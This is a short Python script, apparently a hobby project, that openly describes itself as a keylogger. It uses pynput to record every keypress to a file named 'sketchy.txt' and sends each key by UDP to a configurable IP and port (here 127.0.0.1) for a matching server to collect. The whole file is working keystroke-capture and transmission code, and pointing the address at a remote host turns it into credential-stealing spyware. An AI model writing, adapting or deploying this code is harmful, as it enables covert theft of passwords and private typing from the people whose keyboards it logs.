# Keylogger program that sends keypresses to designated UDP IP/Port
# and adds them to a txt file as well. Must run UDP server counterpart.

from pynput import keyboard
import datetime
import socket

def sockClient(Message):
    # Declare IP address and port number
    IP_ADDRESS = "127.0.0.1"
    PORT_NO = 65432

    # Create the socket object
    clientSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Send the message
    clientSock.sendto(Message.encode(), (IP_ADDRESS, PORT_NO))
    clientSock.close()

# Log keypresses to a .txt file
def logKeypresses(key,):
    file = open("sketchy.txt","a")
    if str(key) != "Key.shift_r" and str(key) != "Key.shift":
        if str(key) == "Key.space":
            file.write(" ")
        elif str(key) == "Key.enter":
            file.write("\n")
        else:
            file.write(str(key))

    # Send to server one character at a time...
    sockClient(str(key))
    file.close()

# Detect keypress
def on_press(key):
    try:
        #print('alphanumeric key {0} pressed'.format(
        #    key.char))
        logKeypresses(key)
    except AttributeError:
        #print('special key {0} pressed'.format(
        #    key))
        logKeypresses(key)

# Detect key release
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    # Initialize date and timestamp file for logging
    file = open("sketchy.txt","a")
    file.write(str(datetime.datetime.now())+" ")
    file.close()

    # Collect events until esc is pressed
    print("press esc to exit")
    with keyboard.Listener(on_press=on_press,
                           on_release=on_release) as listener:
        listener.join()

    # Start a new line in the file
    file = open("sketchy.txt","a")
    file.write("\n\n\n")
    file.close()



main()
